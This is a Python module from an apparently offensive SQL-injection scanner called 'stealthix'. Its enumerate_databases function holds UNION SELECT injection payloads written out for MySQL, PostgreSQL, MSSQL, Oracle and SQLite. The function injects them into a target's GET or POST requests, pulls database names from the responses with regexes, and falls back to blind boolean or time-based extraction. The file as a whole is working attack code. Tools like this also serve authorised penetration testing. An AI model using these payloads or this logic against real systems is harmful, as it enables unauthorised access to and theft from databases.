from __future__ import annotations

from typing import Any

from stealthix.core.session import ScanSession
from stealthix.detection.rest_api import method_uses_body
from stealthix.extraction.base import (
    _apply_injection,
    _extract_values,
    _finalize_collection_result,
    _get_extraction_profile,
    _make_request,
    _merge_results,
    _plugin_family,
    _preferred_extraction_techniques,
    _prepare_payload,
    _record_success,
    _response_entry,
    _result_base,
)
from stealthix.extraction.blind import enumerate_databases_blind
from stealthix.extraction.nosql_extract import enumerate_databases_nosql


def _payloads(dbms: str | None) -> list[str]:
    if dbms in {"mysql", "mariadb", "tidb"}:
        return ["' UNION SELECT schema_name FROM information_schema.schemata--"]
    if dbms in {"postgresql", "cockroachdb"}:
        return ["' UNION SELECT datname FROM pg_database--"]
    if dbms == "mssql":
        return ["' UNION SELECT name FROM master..sysdatabases--"]
    if dbms == "oracle":
        return ["' UNION SELECT owner FROM all_users--"]
    if dbms == "sqlite":
        return ["' UNION SELECT name FROM pragma_database_list--"]
    return [
        "' UNION SELECT schema_name FROM information_schema.schemata--",
        "' UNION SELECT datname FROM pg_database--",
        "' UNION SELECT name FROM master..sysdatabases--",
        "' UNION SELECT owner FROM all_users--",
        "' UNION SELECT name FROM pragma_database_list--",
    ]


def enumerate_databases(session: ScanSession) -> dict[str, Any]:
    if _plugin_family(session) == "nosql":
        return enumerate_databases_nosql(session)
    dbms = (session.config.dbms or "").lower()
    default_payloads = _payloads(dbms)
    profile = _get_extraction_profile(session, "databases") or {}
    payloads = (
        profile.get("payloads") if isinstance(profile.get("payloads"), list) else default_payloads
    )
    techniques = _preferred_extraction_techniques(session)
    results = _result_base(session, "databases", payloads if "union" in techniques else [])
    results["databases"] = []
    default_patterns = [
        r"\bdatabase[:=\s]+([a-z0-9_]+)",
        r"\bdb[:=\s]+([a-z0-9_]+)",
        r"\bschema[:=\s]+([a-z0-9_]+)",
    ]
    patterns = (
        profile.get("patterns") if isinstance(profile.get("patterns"), list) else default_patterns
    )
    if "union" in techniques:
        for payload in payloads if isinstance(payloads, list) else []:
            prepared = _prepare_payload(session, payload)
            if method_uses_body(session.config.method):
                target, data = _apply_injection(session, prepared)
                body, elapsed = _make_request(session, target, data, "POST")
            else:
                target, _ = _apply_injection(session, prepared)
                body, elapsed = _make_request(session, target)
            results["responses"].append(_response_entry(target, prepared, body, elapsed))
            extracted = _extract_values(body, patterns)
            if extracted:
                _record_success(results, prepared)
                results["databases"].extend(extracted)
        results = _finalize_collection_result(results, "databases")
        if results["success"]:
            results["technique"] = "union"
            return results

    merged = results
    for technique in techniques:
        if technique not in {"boolean", "time"}:
            continue
        blind_result = enumerate_databases_blind(session, technique=technique)
        merged = _merge_results(results, blind_result)
        if blind_result.get("success"):
            return merged
    return merged
